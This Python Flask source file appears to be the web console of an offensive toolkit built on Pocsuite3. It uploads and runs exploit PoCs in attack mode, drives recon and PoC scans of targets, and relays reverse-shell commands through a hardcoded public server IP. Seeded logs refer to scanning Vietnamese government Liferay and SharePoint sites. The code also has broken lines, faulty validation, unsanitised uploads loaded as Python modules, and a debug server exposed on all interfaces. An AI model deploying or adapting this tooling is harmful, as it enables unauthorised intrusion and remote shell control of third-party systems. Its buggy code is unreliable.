
import re
from requests_toolbelt.utils import dump
import sys,types
from os import urandom,path as ospath,remove as osremove
from lib import database, const
from flask_wtf import CSRFProtect
from lib.server.server import Server
from flask import Flask, render_template, request, session, jsonify, redirect, url_for, escape,send_from_directory, Markup
##IMPORTING POCSUITE3
from pocsuite3.lib.core.data import kb,conf
lib_path = ospath.abspath(ospath.join('pocsuite3'))
# thêm thư mục cần load vào trong hệ thống
sys.path.append(lib_path)
from json2html import *
import json
import datetime
import time
import requests

try:
    import pocsuite3
except ImportError:
    sys.path.append(ospath.abspath(ospath.join(ospath.dirname(__file__), ospath.pardir)))
from pocsuite3.cli import check_environment, module_path
from pocsuite3 import set_paths
from pocsuite3.lib.core.interpreter import PocsuiteInterpreter
from pocsuite3.lib.core.option import init_options
# from pocsuite3.modules.listener.reverse_tcp import  WebServer
#Running Poc_core
check_environment()
set_paths(module_path())
init_options()
poc_core = PocsuiteInterpreter()
## Ending IMPORTING POCSUITE#


app = Flask(__name__)
app.config['JSON_SORT_KEYS'] = False
app.config['SECRET_KEY'] = urandom(0x200)  # cookie encryption
UPLOAD_FOLDER = ospath.dirname(ospath.abspath(__file__))+'/pocsuite3/pocs'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024
app.config['MAX_RECENT_JOBS']=20
ALLOWED_EXTENSIONS = set(['txt', 'py'])
# Protection against CSRF attack
CSRFProtect(app)
# server
# server = Server()
server = Server()
db = database.Database()
listJobs=[]



APIurl = "http://0.0.0.0:5001"
PublicServer = "http://75.119.131.210:5001"


def login_required(func):
    def wrapper(*args, **kwargs):
        if not 'logged_in' in session:
            return redirect(url_for('index'))
        elif not session['logged_in']:
            return redirect(url_for('index'))
        else:
            return func(*args, **kwargs)
    wrapper.__name__ = func.__name__
    return wrapper


def bot_required(func):
    def wrapper(*args, **kwargs):
        if not 'bot_id' in session:
            return jsonify({'resp': ''})
        if not get_bot(session['bot_id']):
            return jsonify({'resp': ''})
        return func(*args, **kwargs)
    wrapper.__name__ = func.__name__
    return wrapper


#Usernames & Passwords

def is_valid_username(username):
    username = username.strip()
    resp = {'status': 0, 'msg': ''}

    if len(username) == 0:
        return resp

    if len(username) < const.MIN_USERNAME_LENGTH:
        resp['msg'] = 'Username must contain at least ' + \
            const.MIN_PASSWORD_LENGTH + ' characters'
        return resp
    elif len(username) > const.MAX_USERNAME_LENGTH:
        resp['msg'] = 'Username must contain at most ' + \
            const.MAX_USERNAME_LENGTH + 'characters'
        return resp

    if re.findall(r'\W', username):
        resp['msg'] = 'Username must not contain a special or space character'
        return resp

    resp['status'] = 1
    return resp


def is_valid_password(password):
    _password = password
    password = password.strip()
    resp = {'status': 0, 'msg': ''}

    if len(password) == 0:
        return resp

    Length

    if len(password) < const.MIN_PASSWORD_LENGTH:
        resp['msg'] = 'Password must contain at least ' + \
            const.MIN_PASSWORD_LENGTH + ' characters'
        return resp

    elif len(password) > const.MAX_PASSWORD_LENGTH:
        resp['msg'] = 'Password must contain at most ' + \
            const.MAX_PASSWORD_LENGTH + ' characters'
        return resp

    Diversity

    if re.findall(r'^\d+\d$', password):
        resp['msg'] = 'Password must not only consist of numbers'
        return resp

    if not re.findall(r'\d', password):
        resp['msg'] = 'Password must contain a number'
        return resp

    if not re.findall(r'\w', password):
        resp['msg'] = 'Password must contain a letter'
        return resp

    #Spaces

    if re.findall(r'^\s|\s$', _password):
        resp['msg'] = 'Password must not start or end with a space'
        return resp

    if not re.findall(r'\s', password):
        resp['msg'] = 'Password must contain a space'
        return resp

    if re.findall(r'\s{2,}', password):
        resp['msg'] = 'Password must not consist of consecutive spaces'
        return resp

    resp['status'] = 1
    return resp


#-------- Endpoints -------- #

@app.route('/')
def index():
    if not 'logged_in' in session:
        session['logged_in'] = False
        return render_template('index.html')
    if not session['logged_in']:
        return render_template('index.html')
    return render_template('dashboard.html')
    #return render_template('poc.html', data=r'pocs\sharepoint_16.0_typeconverter_rce')

@app.route('/settings')
@login_required
def settings():
    return render_template('settings.html')

@app.route('/get-account-status', methods=['GET'])
@login_required
def get_default_creds_status():
    status = {
        'msg': db.get_account_status(session['user_id'], session['username'])
    }

    return jsonify(status)


@app.route('/update-username-password', methods=['POST'])
@login_required
def update_username_password():
    resp = {
        'new-username': {'status': 0, 'msg': ''},
        'current-password': {'status': 0, 'msg': ''},
        'new-password': {'status': 0, 'msg': ''},
        'confirm-password': {'status': 0, 'msg': ''}
    }

    if (not 'newUsername' in request.form or
        not 'currentPassword' in request.form or
        not 'newPassword' in request.form or
            not 'confirmPassword' in request.form):
        return jsonify({'resp': 'Please provide all argument'})

    new_username = request.form['newUsername']
    current_password = request.form['currentPassword']
    new_password = request.form['newPassword']
    confirm_password = request.form['confirmPassword']

    if len(current_password) == 0 and len(new_username) == 0:
        return jsonify(resp)

    new_password_resp = is_valid_password(new_password)
    new_username_resp = is_valid_username(new_username)

    if len(current_password):
        if not db.compare_passwords(session['user_id'], current_password):
            resp['current-password']['msg'] = 'Please provide the correct password'
        else:
            if new_password_resp['status'] == 0:
                resp['new-password']['msg'] = new_password_resp['msg']
            else:
                if new_password != confirm_password:
                    resp['confirm-password']['msg'] = 'Passwords do not match'
                else:
                    db.update_password(session['user_id'], new_password)
                    resp['new-password']['msg'] = 'Password has been updated'
                    resp['new-password']['status'] = 1

    if len(new_username):
        if new_username_resp['status'] == 0:
            resp['new-username']['msg'] = new_username_resp['msg']
        else:
            if not db.account_exists(new_username):
                db.update_username(session['user_id'], new_username)
                resp['new-username']['msg'] = 'Username has been updated'
                session['username'] = new_username.lower()
                resp['new-username']['status'] = 1
            else:
                resp['new-username']['msg'] = 'Must be a new username'

    session['account_status'] = db.get_account_status(
        session['user_id'], session['username'])

    return jsonify(resp)


def valid_ip(ip):
    if not re.match(r'^(?!0)(?!.*\.$)((1?\d?\d|25[0-5]|2[0-4]\d)(\.|$)){4}$', ip):
        return False
    return True


def valid_port(port):
    _port = str(port).strip()

    if not len(_port):
        return False
    else:
        #  check if number
        for item in _port:
            if not item.isdigit():
                return False

        # check if number starts with a zero
        if int(_port[0]) == 0:
            return False

        # check if number is larger than 65535
        if int(_port) > 65535:
            return False

        if any([int(_port) == const.FTP_PORT, int(_port) == const.SSH_PORT]):
            return False
        return True



@app.route('/login', methods=['GET', 'POST'])
def login():
    if not 'logged_in' in session:
        return redirect(url_for('index'))

    if session['logged_in']:
        return redirect(url_for('index'))

    if not ('username' in request.form and 'password' in request.form):
        return jsonify({'is_authenticated': False, 'msg': 'Provide all requirements'})

    username = escape(request.form.get('username').strip())
    password = escape(request.form.get('password'))


    if not len(username) or not len(password):
        return jsonify({'is_authenticated': False, 'msg': 'Username and password required'})

    #attempt to login
    user_id, role = db.authenticate(username, password)

    if not user_id:
        return jsonify({'is_authenticated': False, 'msg': 'Incorret username or password'})

    session['logged_in'] = True
    session['user_id'] = user_id
    session['role'] = role
    session['username'] = username.title()
    session['server_active'] = False
    session['port'] = None
    session['ip'] = None

    if server.is_active:
        server_start(server.ip, server.port)

    session['account_status'] = db.get_account_status(user_id, username)
    
    return jsonify({'is_authenticated': True, 'msg': ''})


@app.route('/logout')
@login_required
def logout():
    session.clear()
    return redirect(url_for('index'))

# Kim From 17-9-2020
@app.route('/pocs')
@login_required
def pocs():
    role = session.get('role')
    if(role == 1): 
        return render_template('pocs.html')
    else: 
        return render_template('403.html')
@app.route('/fetch-pocs', methods=['GET'])
@login_required
def fetch_pocs():
    listModules= poc_core.get_all_modules()
    allPocs=[]
    count=0
    for module in listModules:
        count+=1
        oneRow={
        "id":str(count),
        "appversion":module["appversion"],
        "name":module["name"],
        "appname":module["appname"],
        "path":module["path"], 
        "description": module["pocdescription"]
        }
        allPocs.append(oneRow)  
    return jsonify({
        'pocs': allPocs,
    })
@app.route('/get-poc-info', methods=['POST'])
@login_required
def get_poc_info():
    if not 'poc-path' in request.form:
        return jsonify({'status': -1, 'msg': 'poc-path is required'})

    poc_path = request.form['poc-path']
    if not ('pocs' in poc_path):
        poc_path+='pocs/'+poc_path
    try:
        poc_core.command_use(poc_path)
    except:
        return jsonify({'status': -1, 'msg': 'No poc is available by that poc-path'})
    if not poc_core.current_module:
        return jsonify({'status': -1, 'msg': 'No poc is available by that poc-path'})
    modeString=''
    if hasattr(poc_core.current_module, '_shell'):
        modeString+='shell '
    if hasattr(poc_core.current_module, '_verify'):
        modeString+='verify '
    if hasattr(poc_core.current_module, '_attack'):
        modeString+='attack '
    currentPoC=poc_core.current_module

    isServerOnline=[]
    if(server.is_active):
        isServerOnline=[session['ip'],session['port']]
    data = {
        'info': get_info_poc_as_dict(),
        'modes':modeString,
        'global_options': get_detail_options(currentPoC.global_options),
        'payload_options': get_detail_options(currentPoC.payload_options),
        'poc-path':poc_path,
        'isServerOnline':isServerOnline
    }
    return jsonify({'status': 0, 'data': data})
def get_info_poc_as_dict():
    if not poc_core.current_module:
        return {}
    fields = ["name", "VulID", "version", "author", "vulDate", "createDate", "updateDate", "references",
                  "appPowerLink", "appName", "appVersion", "vulType", "desc"]
    displayFields=["Name", "Vulnerable ID", "PoC version", "Author", "Vulnerability Data", "Created Data", "Updated date", "References",
                  "Platform Homepage", "Platform", "Platform Version", "Vulnerability Type", "PoC Description"]
    ret = {}
    # for field in fields:
    for i in range(len(fields)):
            value = getattr(poc_core.current_module, fields[i], None)
            if value:
                ret[displayFields[i]]=str(value).strip()
    return ret
def get_detail_options(options):
    ret=[]
    try:
        for name, opt in options.items():
            value = opt.value
            ret.append([name, value, opt.type, opt.description])
    except:
        print("error in get_detail_options")
            
    return ret



#From 2020/09/19

def poc_required(func):
    
    def wrapper(*args, **kwargs):
        if not poc_core.current_module:
            return jsonify({'resp': ''})
        return func(*args, **kwargs)
    wrapper.__name__ = func.__name__
    return wrapper


#From 2020-9-19 10:48



def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
@app.route('/upload')
@login_required
def upload():
    role = session.get('role')
    if(role == 1): 
        return render_template('upload.html')
    else: 
        return render_template('403.html')
@app.route('/uploadfile', methods=['POST'])
@login_required
def uploadFile():
    # check if the post request has the file part
    if 'files[]' not in request.files:
        resp = jsonify({'message' : 'No file part in the request'})
        resp.status_code = 400
        return resp

    files = request.files.getlist('files[]')
    originalFile=''
    errors = {}
    success = False
    for file in files:
        if file and allowed_file(file.filename):
            filename = (file.filename)
            originalFile=filename
            file.save(ospath.join(app.config['UPLOAD_FOLDER'], filename))
            success = True
        else:
            errors[file.filename] = 'File type is not allowed'
    if originalFile:
        logAction='Upload POC'
        logStatus=0
        logDesc="Upload PoC file: "+originalFile
        log={
            'action':logAction,
            'desc':logDesc,
            'status':logStatus
        }
        LogJobs(log)   
    if success and errors:
        errors['message'] = 'File(s) successfully uploaded'
        resp = jsonify(errors)
        resp.status_code = 206
        return resp
    if success:
        resp = jsonify({'message' : 'Files successfully uploaded'})
        resp.status_code = 200
        #Uplaod successfully --> Reload Core Pocsuite3
        global poc_core
        new_poc_core=PocsuiteInterpreter()
        poc_core=new_poc_core
        LogLastStatus(1)
        return resp
    else:
        resp = jsonify(errors)
        resp.status_code = 400
        return resp
@app.route('/target-file', methods=['POST'])
@login_required
def getTargetsFromFile():
    # check if the post request has the file part
    if 'files[]' not in request.files:
        resp = jsonify({'message' : 'No file part in the request'})
        resp.status_code = 400
        return resp
    files = request.files.getlist('files[]')

    errors = {}
    success = False
    targets=[]
    for file in files:
        if file:
            filename = (file.filename)
            if isTxtFile(filename):
                savePath=ospath.join(app.config['UPLOAD_FOLDER'], 'targetfile.txt')
                file.save(savePath)
                file1 = open(savePath, 'r') 
                Lines = file1.readlines() 
                # Strips the newline character 
                for line in Lines: 
                    targets.append(line.strip())
                file1.close()
                if ospath.exists(savePath):
                    osremove(savePath)
                success = True
            else:
                errors[file.filename] = 'File type is not allowed'
        else:
            errors[file.filename] = 'File type is not allowed'
    if success and errors:
        errors['message'] = 'File(s) successfully uploaded'
        resp = jsonify({'targets':targets,'errors':errors})
        resp.status_code = 206
        return resp
    if success:
        resp = jsonify({'targets' : targets})
        resp.status_code = 200
        #Uplaod successfully --> Reload Core Pocsuite3
        return resp
    else:
        resp = jsonify(errors)
        resp.status_code = 400
        return resp
def isTxtFile(filename):
    ret=False
    if '.' in filename:
        filename=filename.split('.')
        if filename[1]=='txt':
            ret=True
    return ret
@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('dashboard.html')

@app.route('/poc', methods=['GET'])
@login_required
def SinglePoc():
    pocPath=''
    pocPath=request.args.get('path')

    return render_template('poc.html', data=pocPath)
@app.route('/attack-mode', methods=['POST'])
@login_required
def AttackMode():
    params={}
    for key in request.form:
        params[key]=request.form[key]
    #Set params to pocsuite3
    for key,val in params.items():
        key=key.replace('-value','')
        command=key+' '+ val
        print(command)
        poc_core.command_set(command)
        
    #Realise MODE command --> VERIFY
    poc_core.command_show('options')
    result={}
    try:
        poc_core.command_attack()
        tmp=poc_core.current_module.result
        if(isinstance(tmp,dict)):
            for key,val in tmp.items():
                result[key]=val
        else:
            result['result']=str(tmp)
    except:
        result['result']='No result'   
    
    # newwww=html_report.HtmlReport()
    # newwww.start()

    result['target']=params['target-value']
    # x=kb.plugins
    result['mode']='Attacked'
    return jsonify({'status': 0, 'data': result})


@app.route('/dashboard-info', methods=['POST'])
@login_required
def DashboardInfo():
    pocs={}
    bots=0
    users=1
    jobs=listJobs
    # listjobs=[
    #     {
    #         'action':
    #         'status':
    #         'desc':
    #         'datetime':
    #     }
    # ]
    try:
        listModules= poc_core.get_all_modules()
        for module in listModules:
            if not module['appname']:
                continue
            if not (module['appname'] in pocs):
                pocs[module['appname']]=1
            else:
                pocs[module['appname']]+=1

    except:
        pass
    try:
        bots= server.total_clients()
    except:
        pass
    result={
        'pocs':pocs,
        'bots':bots,
        'users':users,
        'jobs':jobs,
    }
    return jsonify({'status': 0, 'data': result})
def LimitLogJobs():
    """
        Only save MAX_RECENT_JOBS
    """
    global listJobs
    idJob=len(listJobs)
    idJob+=1
    if idJob > app.config['MAX_RECENT_JOBS']:
        del listJobs[listJobs-1]
        idJob=app.config['MAX_RECENT_JOBS']
def LogSeeding():
    global listJobs
    dt=str(datetime.now().strftime("%Y/%m/%d %H:%M:%S"))
    log={
            'action':'Scan Online',
            'desc':'Scan Liferay with: gov.vn',
            'status':1,
            'datetime':dt
    }
    listJobs.append(log)
    log={
            'action':'Scan From File',
            'desc':'Scan Liferay with: listDAS.txt',
            'status':0,
            'datetime':dt
    }
    listJobs.append(log)
    log={
            'action':'Scan online',
            'desc':'Scan Sharepoint with query: .vn inurl:AllWebPages.aspx',
            'status':-1,
            'datetime':dt
    }
    listJobs.append(log)
def LogJobs(log):
    # log={
    #         'action':action,
    #         'desc':desc,
    #         'status':status
    #         'datetime':datetime
    #     }
    LimitLogJobs()
    log['datetime']=str(datetime.now().strftime("%Y/%m/%d %H:%M:%S"))
    global listJobs
    listJobs.insert(0,log)
def LogLastStatus(status):
    """
    status -1,0,1 fail,running, success
    """
    global listJobs
    if len(listJobs)<1:
        return
    
    listJobs[0]['status']=status




















#####phan do khoa viet them############## 

#####bat dau phan dash board #########################
@app.route('/getExtension', methods=['POST'])
@login_required
def getExtension(): 
    mode = request.form['mode']
    param = {
        "type": mode
    }
    res = requests.get(APIurl + '/api/v1/reconnaissance/extension', params=param)
    return res.json()
@app.route('/reconhistory', methods=['GET'])
@login_required
def getReconHistory(): 
    res = requests.get(APIurl + "/api/v1/reconnaissance/getall")
    return res.json()
@app.route('/senddatatorecon', methods=['GET'])
@login_required
def send_data_to_recon(): 
    recon_id = request.args['id']
    param = {
        "_id": recon_id
    }
    res = requests.get(APIurl + "/api/v1/reconnaissance/get", params=param, verify=False) 
    return res.json()
#####Ket thuc phan dashboard#########################


#####bat dau phan target ############################
@app.route('/addtarget', methods=['POST'])
@login_required
def addTarget(): 
    url = request.form['url']
    name = request.form['name']
    param = {
        "url": url, 
        "name": name
    }
    res = requests.post(APIurl + '/api/v1/target/insert',data=param)
    return res.json()

@app.route('/getalltarget',methods=['GET'])
@login_required
def TargetInfo():
    res =  requests.get(APIurl + '/api/v1/target/getall')
    return res.json()
@app.route('/deletetarget', methods=['DELETE'])
@login_required
def DeleteTarget(): 
    targetID = request.form['targetid']
    print(targetID)
    param = {
        "target_id": targetID
    }
    res = requests.delete(APIurl + '/api/v1/target/delete',data=param)
    return res.json()
@app.route('/gettargeturl', methods=['POST'])
@login_required
def GetTargetURL(): 
    target_id = request.form['id']
    param = {
        "target_id":target_id
    }
    res = requests.get(APIurl + "/api/v1/target/gettarget", params=param)
    return res.json()
#####ket thuc phan target#############################





############thuc hien phan recon######################
@app.route('/checklastrecon', methods=['POST'])
@login_required
def CheckLastRecon(): 
    targetid = request.form['id']
    param = {
        "target_id": targetid
    }
    res = requests.get(APIurl+"/api/v1/reconnaissance/lastrecon", params=param)
    responseJson= res.json()
    if(responseJson["message"] == "success"): 
        lastdate = responseJson['data']['date_end']; 
        lastdate_format = datetime.datetime.strptime(lastdate, '%d/%m/%Y %H:%M:%S')
        datenow = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        datenow = datetime.datetime.strptime(datenow, "%Y-%m-%d %H:%M:%S")
        delta = datenow - lastdate_format
        if(delta.days  >=7 ): 
            result = {
                "message": "success", 
                "data":"success to recon", 
                "last_recon": 0
            }
            return result
        else:
            print(delta)
            result = {
                "message": "fail", 
                "data": str(delta),
                "last_recon": 1
            }
            return result
    else: 
        result = {
            "message": "fail", 
            "data": "no recon available", 
            "last_recon": 0
        }   
        return result
    
@app.route('/getreportbytarget', methods=['POST'])
@login_required
def GetReportByTarget(): 
    targetid = request.form['id']
    param = {
        "target_id": targetid
    }
    res = requests.get(APIurl + "/api/v1/reconnaissance/getReports", params=param)
    return res.json()
@app.route('/reconnaisance', methods=['POST'])
@login_required
def Recon(): 
    extension = ''
    target_id = request.form['id']
    tools  = request.form.getlist('tools[]')
    for i in tools: 
        extension += "*" + i + "*"
    param = {
        "target_id": target_id, 
        "extension": extension
    }
    res = requests.put(APIurl + "/api/v1/reconnaissance/start", data=param)
    return res.json()
@app.route('/reconstatus', methods=['GET'])
@login_required
def ReconStatus(): 
    res = requests.get(APIurl + "/api/v1/reconnaissance/status")
    return res.json()
@app.route('/getreconresult', methods=['POST'])
@login_required
def RenderRecon():
    target_id = request.form['id']
    param = {
        'target_id': target_id
    }
    res = requests.get(APIurl + "/api/v1/reconnaissance/get", params=param)
    return res.json()

@app.route('/renderrecondetail', methods=['GET'])
@login_required
def getReconReport(): 
    reconid = request.args['reconid']
    param = {
        "_id": reconid
    }
    res = requests.get(APIurl + "/api/v1/reconnaissance/get", params=param)
    content = res.json()['data'][0]
    infoFromJson = json.loads(json.dumps(content))
    target_id = infoFromJson['target_id']
    param = {
        "target_id":target_id
    }
    res = requests.get(APIurl + "/api/v1/target/gettarget", params=param)
    target = res.json()['data']['url']
    infoFromJson = json.dumps(content).replace('target_id', 'target')
    infoFromJson = json.loads(infoFromJson)
    infoFromJson['target'] = target
    data_html = json2html.convert(json = infoFromJson, table_attributes='border="1px solid lightgray" style="margin-left: auto; margin-right: auto; margin-top: 50px; margin-bottom: 50px;"')
    value = Markup(data_html)
    return render_template("output.html",data=value, target=target)

@app.route('/deleterecon', methods=['POST'])
@login_required
def DeleteRecon(): 
    reconnaissance_id = request.form['id']
    param = {
        "reconnaissance_id": reconnaissance_id
    }
    res = requests.delete(APIurl + "/api/v1/reconnaissance/delete", params=param)
    return res.json()


############thuc hien phan check POC#####################
@app.route('/getpoccheckresult', methods=['POST'])
@login_required
def RenderPOCCheck(): 
    target_id = request.form['targetid']
    param = {
        "target_id":target_id
    }
    res = requests.get(APIurl + '/api/v1/pocs/get', params=param)
    return res.json()

@app.route('/getpoccheckstatus', methods=['GET'])
@login_required
def POCCheckStatus(): 
    res = requests.get(APIurl + '/api/v1/pocs/status')
    return res.json()

@app.route('/runpocscan', methods=['POST'])
@login_required
def runScan(): 
    target_id = request.form['targetid']
    param = {
        "recon_id":target_id
    }
    res = requests.put(APIurl + '/api/v1/pocs/start', data=param)
    return res.json()


#############thuc hien phan reverse shell################
@app.route('/closeport', methods=['POST'])
@login_required
def ClosePort(): 
    port = request.form['port']
    param = {
        'port':port
    }
    res = requests.get(PublicServer + '/closeport', params=param)
    print(res.text)
    return res.text

@app.route('/sendshelldata', methods=['POST'])
@login_required
def SendShellData(): 
    port = request.form['port']
    cmd = request.form['cmd']
    param = {
        'port': port, 
        'message': cmd
    }
    res = requests.get(PublicServer + '/send', params=param)
    print(res.text)
    return res.text
@app.route('/getshelldata', methods=['GET'])
@login_required
def GetShellData(): 
    port = request.args['port']
    length = request.args['length']
    param = {
        'port':port, 
        'length': length
    }
    res = requests.get(PublicServer + '/receive', params=param)
    print(res.text)
    return res.text
@app.route('/runshell', methods=['POST'])
@login_required
def runshell(): 
    pocid = request.form['pocid']
    port = request.form['port']
    host = request.form['host']
    param = {
        "checkpoc_id":pocid, 
        'data': {
            "LHOST":host,
            "LPORT":port
        }
    }
    headers = {'Content-type': 'application/json', 'Accept': 'text/plain'}
    res = requests.put(APIurl + '/api/v1/pocs/runshell',json=param,headers=headers)
    data = dump.dump_all(res)
    print(data.decode('utf-8'))
    print(res.json())
    return res.json()
@app.route('/shellstatus',methods=['GET'])
@login_required
def ShellStatus(): 
    res = requests.get(APIurl + "/api/v1/pocs/status_shell")
    return res.json()
##############ket thuc phan reverse shell##################
##############thuc hien phan luu data #####################
@app.route('/publicserver', methods=['POST'])
@login_required
def SavePublicServer(): 
    publicserver = request.form['publicserver']
    publicport = request.form['publicport']
    username = request.form['username']
    password = request.form['password']
    #goi ham luu thong tin va tra ve ket qua
    res = requests.get()
    return res.json()










if __name__ == '__main__':
    # app.run(host='localhost', port=5000, debug=True)
    app.run(host='0.0.0.0', port=5000,debug=True)
    server.stop()
